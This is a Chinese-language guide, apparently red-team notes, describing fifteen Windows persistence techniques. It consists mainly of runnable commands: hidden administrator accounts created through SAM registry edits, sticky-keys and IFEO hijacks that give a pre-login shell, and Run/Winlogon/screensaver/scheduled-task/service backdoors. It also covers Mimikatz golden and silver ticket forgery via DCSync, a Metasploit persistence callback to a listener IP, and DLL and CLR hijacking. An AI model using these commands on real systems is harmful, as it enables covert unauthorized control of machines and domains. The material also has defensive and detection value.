# 15种windows权限维持

## 1. 影子账户

    1. 使用如下命令创建隐藏账户并加入管理组

        ```cmd
            net user test$ 123456 /add
            net localgroup administrators test$ /add
        ```

        创建成功后使用net user 命令无法查看到此用户，但是在计算机管理页面中还可以看到，需要通过修改注册表信息来隐藏

    2. 打开注册表信息(HKEY_LOCAL_MACHINE\SAM\SAM)
        修改SAM权限，赋予adminitrators完全控制权限。

    3. 将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值。

    4. 将test$和所对应项000003F1导出，分别命名为test.reg和1.reg

    5. 删除test$用户，将test.reg和1.reg导入注册表

        ```cmd
            net user test$ /del
            regedit /s test.reg
            regedit /s 1.reg
        ```

    6. 此时在用户组已经看不到test$用户，只能在注册表中能看到。

## 2. 粘滞键后门(亲测win11无效)

    粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。

    粘滞键位置：c:\windows\system32\sethc.exe
    命令
    ```cmd
        move sethc.exe sethc1.exe
        copy cmd.exe sethc.exe
    ```

    此时连按五次shift键即可启动cmd，而且不需要登录就可以执行

## 3. logon scripts后门

    Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。

    注册表位置：HKEY_CURRENT_USER\Environment

    ```cmd
        REG ADD "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\666.exe"    #创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径
    ```

## 4. 映像劫持

    “映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。

    注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\

    在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe

    ```cmd
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
    ```

    此时点击五次shift键会打开cmd。

## 5. 注册表自启动后门

    1. 位置一:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        添加键test，值为后门程序路径。

        ```cmd
            REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v test1 /t REG_SZ /d "C:\666.exe"
        ```

    2.位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

    修改键Userinit的值，重启就会自动运行程序。
    `C:\Windows\system32\userinit.exe,cmd.exe`

## 6. 屏幕保护程序后门

    屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。

    注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop

    SCRNSAVE.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。
    ScreenSaveActive表示屏保状态，1为启动，0为关闭。
    ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900(15分钟)。
    ScreenSaverIsSecure默认参数为0，标识不需要密码即可解锁。

    修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。
    ```cmd
        reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "c:\666.exe" /f
    ```

## 7. 计划任务后门

    schtasks命令设定计划自动启动后门程序。

    ```cmd
        schtasks /Create /tn Updater /tr c:\666.exe /sc minute /mo 5  #每5分钟自动执行666.exe
    ```

## 8. 服务自启动后门

    自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。

    ```cmd
        sc create test binpath= c:\666.exe    #创建服务
        sc config test start= auto    #设置服务为自动启动
        net start test                #启动服务
    ```

## 9. 黄金票据

    在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。

    查看krbtgt ntlm hash：
    lsadump::dcsync /domain:<域名> /user:krbtgt

    清空票据信息：
    kerberos::purge

    生成票据：
    kerberos::golden /admin:<用户名> /domain:<域名> /sid:<域SID> /krbtgt:<ntlm hash> /ticket:<票据名>

    导入票据：
    kerberos::ptt Administrator.kiribi

## 10.白银票据

    黄金票据伪造的TGT,那么白银票据伪造的是ST。在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,伪造的门票只对部分服务起作用。
    白银票据常用服务：
    |Service Type                   |Service Silver Tickets             |
    |-------------------------------|-----------------------------------|
    | WMI | HOST RPCSS |
    | PowerShell Remoting | HOST HTTP |
    | WinRM | HOST HTTP |
    | Scheduled Tasks | HOST |
    | Windows File Share (CIFS) | CIFS |
    | LDAP operations includingMimikatz DCSync | LDAP |
    | Windows Remote Server Administration Tools | RPCSS LDAP CIFS |

    - 伪造CIFS权限
    CIFS用于主机之间的文件共享

    生成票据：
    kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt

## 11. 组策略设置脚本启动

    1. 首先创建一个脚本，此处为添加隐藏用户，内容如下：

    ```bat
        @echo off
        net user test$ Test123456. /add
        net localgroup administrators test$ /add
        exit
    ```

## 12. bitsadmin

    BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。

    常用命令
    ```cmd
        bitsadmin /create [type] DisplayName //创建一个任务
        bitsadmin /cancel <Job> //删除一个任务
        bitsadmin /list /allusers /verbose //列出所有任务
        bitsadmin /AddFile <Job> <RemoteURL> <LocalName> //给任务test添加一个下载文件
        bitsadmin /SetNotifyCmdLine <Job> <ProgramName> [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。
        bitsadmin /Resume <Job> //激活传输队列中的新任务或挂起的任务。
        bitsadmin /cancel <Job> //删除某个任务
        bitsadmin /reset /allusers //删除所有任务
        bitsadmin /complete <Job> //完成某个任务
    ```

    ```cmd
        win7演示
    ```

## 13. msf persistence后门

    使用persistence模块创建后门。
    参数：
        -A 自动启动匹配的exploit/multi/handler 连接到代理
        -L <opt> 目标主机中要写入有效负载的位置，如果没有，将使用 %TEMP%。
        -P <opt> 要使用的有效负载，默认为 windows/meterpreter/reverse_tcp。
        -S 在启动时自动启动代理作为服务（具有 SYSTEM 权限）
        -T <opt> 要使用的备用可执行模板
        -U 用户登录时自动启动代理
        -X 系统启动时自动启动代理
        -h 帮助菜单
        -i <opt> 每次连接尝试之间的时间间隔（以秒为单位）
        -p <opt> 运行 Metasploit 的系统正在监听的端口
        -r <opt> 运行 Metasploit 的系统的 IP 监听连接
        
    执行如下命令，在目标机创建一个vbs后门，每5秒进行回连：
        `run persistence -S -U -X -i 5 -p 55555 -r 192.168.1.128`

## 14. DLL劫持

    DLL(Dynamic Link Library)文件为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。

    dll加载顺序：

        Windows xp sp2之前：

        1. 进程对应的应用程序所在目录；
        2. 当前目录（Current Directory）；
        3. 系统目录（通过 GetSystemDirectory 获取）；
        4. 16位系统目录；
        5. Windows目录（通过 GetWindowsDirectory 获取）；
        6. PATH环境变量中的各个目录；

        Windows xp sp2之后：

        Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：
        默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1
        1. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:\ProgramFiles\uTorrent）
        2. 系统目录（即%windir%system32）；
        3. 16位系统目录（即%windir%system）；
        4. Windows目录（即%windir%）；
        5. 当前目录（运行的某个文件所在目录，比如C:\Documents and Settings\Administrator\Desktop\test）；
        6. PATH环境变量中的各个目录；

        win7以上版本：

        系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：
        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

    实例：

        1.使用process explorer分析可以劫持的dll文件，劫持sqlite3.dll
        2.使用ahaeadlib将sqlite3.dll转为cpp文件
        3.使用visual studio打开cpp文件插入要执行的后门代码，并生成新的dll文件
        4.将新的dll文件改名为sqlite3.dll，将旧的sqlite3.dll改为sqlite3Org.dll
        5.打开极速pdf阅读器后成功上线

## 15.CLR劫持

    CLR全称Common Language Runtime，中文名称为公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件

    1.修改注册表：HKEY_CURRENT_USER\Software\Classes\CLSID\
    2.配置全局环境变量，不然只在当前cmd窗口劫持.net程序，然后直接执行powershell即可上线。

    ```cmd
        setx cor_enable_profiling 1 /m
        setx cor_profiler {11111111-1234-1234-1234-111111111111} /m
    ```
